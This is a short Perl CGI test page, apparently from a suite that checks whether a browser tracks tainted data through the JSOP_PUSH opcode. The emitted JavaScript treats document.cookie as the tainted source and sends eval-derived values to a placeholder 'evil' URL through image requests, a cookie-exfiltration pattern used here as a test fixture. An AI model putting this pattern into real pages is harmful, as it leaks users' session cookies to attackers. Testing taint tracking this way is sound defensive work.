#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_PUSH";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = { 'x' : 1};
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;

		// shouldn't be evil 

		var dut = eval("for (x in {}) {};");
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			var dut2 = eval("for (x in {}) {};");
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		var dut3 = eval("for (x in evil) {};");
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
